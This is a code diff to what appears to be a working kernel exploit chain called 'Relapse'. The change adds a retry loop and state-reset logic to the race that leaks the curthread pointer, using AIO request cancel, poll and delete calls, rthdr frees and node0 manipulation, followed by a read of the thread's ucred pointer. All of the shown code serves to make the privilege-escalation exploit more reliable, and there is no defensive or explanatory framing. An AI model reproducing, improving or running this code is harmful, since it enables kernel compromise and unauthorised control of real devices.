@@ -34,6 +34,10 @@ const PR_SPIN = 40000000;
 const PR_CUT_MARGIN = 8192;
 const PR_NBLOCK = 8;
 const PR_TOWAIT = 1000;
+// The Wobkot ROP/worker primitive has a wider timing spread than WebKitty's
+// pivoted worker, so a single curthread arming is frequently a dud. Retry the
+// benign leak race a few times before treating it as fatal.
+const PR_LEAK_ATTEMPTS = 3;
 
 const PR_AIO_CMD_READ = 1;
 const PR_AIO_CMD_MULTI = 0x1000;
@@ -618,6 +622,36 @@ function pr_reap_arm(chain = undefined) {
   fn.aio_multi_delete.invoke(pr_arm_ids, PR_NUM, pr_arm_status);
 }
 
+// Reset every piece of state the leak race touches. Safe to call after a
+// failed attempt: no kernel memory has been modified at this point.
+function pr_reset_race() {
+  logger.debug('Relapse leak retry: neutralising race state !!');
+
+  try {
+    pr_set_node0(0, pr_n0_sink);
+  } catch (e) {
+    logger.debug(`Relapse leak retry: node0 neutralise failed: ${e.message} !!`);
+  }
+
+  try {
+    fn.aio_multi_cancel.invoke(pr_arm_ids, PR_NUM, pr_arm_status);
+    fn.aio_multi_poll.invoke(pr_arm_ids, PR_NUM, pr_arm_status);
+    fn.aio_multi_delete.invoke(pr_arm_ids, PR_NUM, pr_arm_status);
+  } catch (e) {
+    logger.debug(`Relapse leak retry: AIO reap failed: ${e.message} !!`);
+  }
+
+  try {
+    pr_free_rthdrs();
+  } catch (e) {
+    logger.debug(`Relapse leak retry: rthdr free failed: ${e.message} !!`);
+  }
+
+  pr_reset_mutex();
+  pr_counter_reset(pr_dummy);
+  pr_counter_reset(pr_n0_sink);
+}
+
 function pr_who_has_f() {
   const gf = mem.alloc(PR_RTH_SIZE);
   const gl = mem.alloc(8);
@@ -906,9 +940,13 @@ async function pr_leak_curthread() {
   pr_reap_arm(chain);
   logger.debug('Relapse leak reaped !!');
 
+  logger.debug(
+    `Relapse leak result: hits=${hits}, hi=0x${hit_hi.toString(16)}, samples=${samples.size}, walked=${ctr_walked()}, cut=${cut_at} !!`,
+  );
+
   if (hits === 0 || hit_hi < 0xffff0000 || samples.size !== 1) {
     throw new Error(
-      `Unable to leak curthread (hits=${hits}, hi=0x${hit_hi.toString(16)}, warm=${warm}) !!`,
+      `Unable to leak curthread (hits=${hits}, hi=0x${hit_hi.toString(16)}, samples=${samples.size}, walked=${ctr_walked()}, cut=${cut_at}, warm=${warm}) !!`,
     );
   }
 
@@ -1070,7 +1108,23 @@ async function pr_exploit_kernel_base() {
   pr_setup_arm_reqs();
 
   logger.info('Relapse stage: curthread leak');
-  await pr_leak_curthread();
+  let leak_err = undefined;
+  for (let attempt = 1; attempt <= PR_LEAK_ATTEMPTS; attempt++) {
+    try {
+      await pr_leak_curthread();
+      leak_err = undefined;
+      break;
+    } catch (e) {
+      leak_err = e;
+      logger.error(
+        `Relapse curthread leak attempt ${attempt}/${PR_LEAK_ATTEMPTS} failed: ${e.message}`,
+      );
+      if (attempt < PR_LEAK_ATTEMPTS) {
+        pr_reset_race();
+      }
+    }
+  }
+  if (leak_err !== undefined) throw leak_err;
 
   logger.info('Relapse stage: pointer read');
   const ucred_lo = await pr_read_low_dword(pr_curthread.add(PR_TD_UCRED_OFF));
